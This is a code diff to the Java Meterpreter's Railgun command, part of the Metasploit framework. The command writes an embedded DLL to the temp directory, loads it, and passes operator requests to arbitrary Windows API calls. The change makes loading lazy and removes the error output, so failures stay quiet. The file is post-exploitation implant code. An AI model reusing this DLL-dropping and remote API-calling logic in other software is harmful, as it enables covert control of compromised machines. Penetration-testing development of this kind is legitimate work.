@@ -9,11 +9,18 @@ import java.io.*;
 import java.util.Arrays;
 
 public class stdapi_railgun_api implements Command {
-    static void ExtractLibFromJar()
+    static boolean ExtractLibFromJar()
     {
         try
         {
             InputStream inputStream = stdapi_railgun_api.class.getResourceAsStream("/railgunLib.dll");
+
+            // Check if the file exists in the Jar
+            if (inputStream == null)
+            {
+                return false;
+            }
+
             String tempDir = System.getProperty("java.io.tmpdir");
             File outputFile = new File(tempDir + "railgunLib.dll");
             if (outputFile.exists())
@@ -36,47 +43,56 @@ public class stdapi_railgun_api implements Command {
             inputStream.close();
             os.close();
             fos.close();
+            return true;
         }
         catch (Exception e)
         {
-            System.out.println(e.getMessage());
+            return false;
         }
     }
 
-    static void LoadLib()
+    static boolean LoadLib()
     {
         try
         {
             // We use System.load as it allows us to specify the library directory as the dll file would be extracted to the temp dir.
             File path = new File(System.getProperty("java.io.tmpdir") + "railgunLib.dll");
             System.load(path.getAbsolutePath());
+            return true;
         }
         catch (Throwable e)
         {
-            e.printStackTrace();
-            System.out.println("Message: " + e.getMessage());
+            return false;
         }
-    }
-
-    static
-    {
-        // HOW TO GENERATE:
-        // If in the directory of this file:
-        // Create the header file:
-        // (On Windows): javac -cp ../../../../../../../../meterpreter/src/main/java;../../../../../../../../shared/src/main/java;../../../../../../../../../javapayload/src/main/java -h . stdapi_railgun_api.java
-        // As this library is for windows only, compile this on x64 windows:
-        // g++ -m64 -DARCH_X86_64=1 -c -I%JAVA_HOME%\include -I%JAVA_HOME%\include\win32 com_metasploit_meterpreter_stdapi_stdapi_railgun_api.c -o com_metasploit_meterpreter_stdapi_stdapi_railgun_api.o
-        // Create the lib:
-        // g++ -shared -o railgunLib.dll com_metasploit_meterpreter_stdapi_stdapi_railgun_api.o -Wl,--add-stdcall-alias
-        // Then compile the meterpreter.jar
-
-        ExtractLibFromJar();
-        LoadLib();
     }
 
     public native void railgunCaller(int sizeOut, byte[] stackBlobIn, byte[] bufferBlobIn, byte[] bufferBlobInOut, String libName, String funcName, String callConv, byte[] bufferBlobOut, int[] errorCode, byte[] errorMessage, long[] returnValue);
 
+    // We need volatile here to ensure that multiple Railgun calls do not interfere with eachother.
+    private static volatile boolean LibraryLoaded = false;
+
+    // HOW TO GENERATE RAILGUN LIBRARY:
+    // If in the directory of this file:
+    // Create the header file:
+    // (On Windows): javac -cp ../../../../../../../../meterpreter/src/main/java;../../../../../../../../shared/src/main/java;../../../../../../../../../javapayload/src/main/java -h . stdapi_railgun_api.java
+    // As this library is for windows only, compile this on x64 windows:
+    // g++ -m64 -DARCH_X86_64=1 -c -I%JAVA_HOME%\include -I%JAVA_HOME%\include\win32 com_metasploit_meterpreter_stdapi_stdapi_railgun_api.c -o com_metasploit_meterpreter_stdapi_stdapi_railgun_api.o
+    // Create the lib:
+    // g++ -shared -o railgunLib.dll com_metasploit_meterpreter_stdapi_stdapi_railgun_api.o -Wl,--add-stdcall-alias
+    // Then compile the meterpreter.jar
     public int execute(Meterpreter meterpreter, TLVPacket request, TLVPacket response) throws Exception {
+        if (!LibraryLoaded)
+        {
+            if (ExtractLibFromJar() && LoadLib())
+            {
+                LibraryLoaded = true;
+            }
+            else
+            {
+                return ERROR_FAILURE;
+            }
+        }
+
         final int sizeOut = request.getIntValue(TLVType.TLV_TYPE_RAILGUN_SIZE_OUT);
         byte[] stackBlob = request.getRawValue(TLVType.TLV_TYPE_RAILGUN_STACKBLOB);
         final byte[] bufferBlobIn = request.getRawValue(TLVType.TLV_TYPE_RAILGUN_BUFFERBLOB_IN);
@@ -104,8 +120,6 @@ public class stdapi_railgun_api implements Command {
         }
         catch (Throwable e)
         {
-            e.printStackTrace();
-            System.out.println("Message: " + e.getMessage());
             return ERROR_FAILURE;
         }
 
